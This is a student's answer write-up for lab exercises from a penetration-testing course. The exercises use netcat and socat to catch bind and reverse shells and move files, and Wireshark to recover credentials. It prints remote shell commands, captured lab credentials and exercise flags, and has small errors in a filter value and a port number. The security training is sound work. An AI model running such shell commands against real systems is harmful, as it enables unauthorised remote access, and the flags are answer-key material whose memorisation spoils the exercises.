---
description: Answers to Practical Tools exercises
---

# Practical Tools

## Netcat

### VM1

Imagine you just gained access to the shell server on the Kali VM #1. You determined this server had the traditional version of Netcat with the `-e` option enabled which has executed the following command: `nc -nlvp 5555 -e /bin/bash`. Use this new access to get the flag.

#### Response

Task is i.e. create bind shell to simple `nc` listener.

```bash
$ nc -nv 192.168.209.52 5555
(UNKNOWN) [192.168.209.52] 5555 (?) open
whoami
student
pwd
/home/student
ls
flag.txt
cat flag.txt
OS{53610a67e1fd8a81faaedca77511a9da}
```

### VM2

In the `/challenge` folder on the Kali VM #2, you will find a helper program called `reverse_shell`. This program takes an IP as its first argument and a port as the second argument. This program will then reach out with a reverse shell to that IP and port. For example, you can run `./reverse_shell 1.2.3.4 1337` to launch a reverse shell to 1.2.3.4 on port 1337. Use this helper program to receive a callback from the shell server and get your flag.

#### Response

I.e. catch reverse shell with `nc`.

Attacker Machine:

```bash
$ nc -lvnp 5555        # Set up listener
```

Target Machine:

```
$ ./reverse_shell <IP> 5555
```

Attacker Machine:

```bash
$ $ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.119.209] from (UNKNOWN) [192.168.209.52] 41726

$ cat flag.txt
OS{bf8645ccb9d5182d3198b28a2c950516}
```

### VM3

You now need to transfer a file from the Kali VM #3 to your local Kali VM. In the `/challenge` folder in the Kali VM #3, you will find the `flag` program, a Linux binary that contains the flag. Use any of the methods discussed in this module to transfer this file from the shell server to your Kali VM. Once on your Kali VM, make executable and run the `flag` program as root to get the flag. Use port 60000 to accomplish this task.

#### Response

Attacker Machine:

```bash
$ $ nc -lvnp 5555 > flag    
listening on [any] 5555 ...
```

Target Machine:

```bash
$ nc -nv 192.168.119.209 5555 < flag
(UNKNOWN) [192.168.119.209] 5555 (?) open
```

Attacker Machine:

<pre class="language-bash"><code class="lang-bash"><strong>$ chmod +x ./flag
</strong>
$ ./flag 
* Verifying that you are running this binary as root on your Kali VM.
You are not running this binary on your Kali VM.
Transfer this to your Kali VM and then execute it to get the flag.
This binary must be run as root.

$ sudo ./flag 
<strong>* Verifying that you are running this binary as root on your Kali VM.
</strong>Great job. Here is your flag: 
OS{851243e508b87e039d0e52b2c6700cdc}
Press any key to continue...
</code></pre>

## Socat

### VM1

Imagine you just gained access to a server. This time, you do not want anyone to be able to view your traffic so you decide to use an encrypted connection. Power on VM #1 and connect to the port in the info tab to get the flag.

#### Response

Use encrypted bind shell to access port 32794 (from VM Info)

```bash
$ socat - OPENSSL:192.168.209.52:32794,verify=0
whoami
student
ls
bind-shell.pem
flag.txt
cat flag.txt
OS{c1a0c0b59a9c400afc41b0e5a16f8edb}
```

### VM2

Exercise is effectively to set up a socat SSL listener and catch a shell (invoked via SSH into the target machine). The exercise is set up improperly unfortunately. The code was retrieved but none of the commands are helpful to store.

## Wireshark

### VM1

To solve this challenge, on VM #1 you need to determine the password that was used to get into the remote server. To do this, download `password_cracking.pcap` from VM #1 webserver. This task is mainly focused on reading packet captures, but it also uses some skills not directly taught in this module like decoding encoded strings or identifying authentication that are very useful for future problems.

#### Response

<pre class="language-bash"><code class="lang-bash"><strong>$ wget http://192.168.209.52/password_cracking.pcap
</strong>--2022-08-28 23:19:03--  http://192.168.209.52/password_cracking.pcap
Connecting to 192.168.209.52:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 119497 (117K) [application/vnd.tcpdump.pcap]
Saving to: ‘password_cracking.pcap’

password_cracking.pcap       100%[=============================================>] 116.70K   637KB/s    in 0.2s    

2022-08-28 23:19:04 (637 KB/s) - ‘password_cracking.pcap’ saved [119497/119497]

$ wireshark password_cracking.pcap 
</code></pre>

First step is to find the valid login (HTTP 200) using the Wireshark filter `http.response.code == 80`and then tracing the HTTP stream of that response to find the request and thus the credentials

### VM2

Let’s continue to test those network analysis skills; however, you will actually be the one capturing the traffic this time. Download traffic-capture executable file from Practical Tools - Wireshark - VM #2 webserver on port 80 and make it connect to the _Practical Tools Wireshark VM #2_. This program will connect to and log into a remote server. Observe the traffic, determine the required information (server, port, and credentials), and then log into this remote server to get the flag.

#### Response

Utillizing the tool revealed the protocol was FTP over port 308

<table><thead><tr><th width="165">Information</th><th>Value</th></tr></thead><tbody><tr><td>Protocol</td><td>FTP</td></tr><tr><td>Port</td><td>3084</td></tr><tr><td>User</td><td>offsec</td></tr><tr><td>Password</td><td>qwerty</td></tr></tbody></table>

I was able to log in to the FTP server but the commands on the server did not seem to work properly and I was unable to download the flag.

```bash
$ ftp 192.168.209.52 -p 3084
Connected to 192.168.209.52.
220 PTAP Fake Transfer Protocol (FTP) Service
Name (192.168.209.52:qwerzxcv): offsec
331 offsec access allowed, send password.
Password: 
230 offsec user logged in.
Remote system type is Command.
ftp> help
Commands may be abbreviated.  Commands are:

!               delete          hash            mlsd            pdir            remopts         struct
$               dir             help            mlst            pls             rename          sunique
account         disconnect      idle            mode            pmlsd           reset           system
append          edit            image           modtime         preserve        restart         tenex
ascii           epsv            lcd             more            progress        rhelp           throttle
bell            epsv4           less            mput            prompt          rmdir           trace
binary          epsv6           lpage           mreget          proxy           rstatus         type
bye             exit            lpwd            msend           put             runique         umask
case            features        ls              newer           pwd             send            unset
cd              fget            macdef          nlist           quit            sendport        usage
cdup            form            mdelete         nmap            quote           set             user
chmod           ftp             mdir            ntrans          rate            site            verbose
close           gate            mget            open            rcvbuf          size            xferbuf
cr              get             mkdir           page            recv            sndbuf          ?
debug           glob            mls             passive         reget           status
ftp> dir
225 Not a valid response. Please try again. Try HELP.
wrong server: return code must be 227
ftp> ls
225 Not a valid response. Please try again. Try HELP.
wrong server: return code must be 227
ftp> pwd
Unable to determine remote directory
ftp> 
```
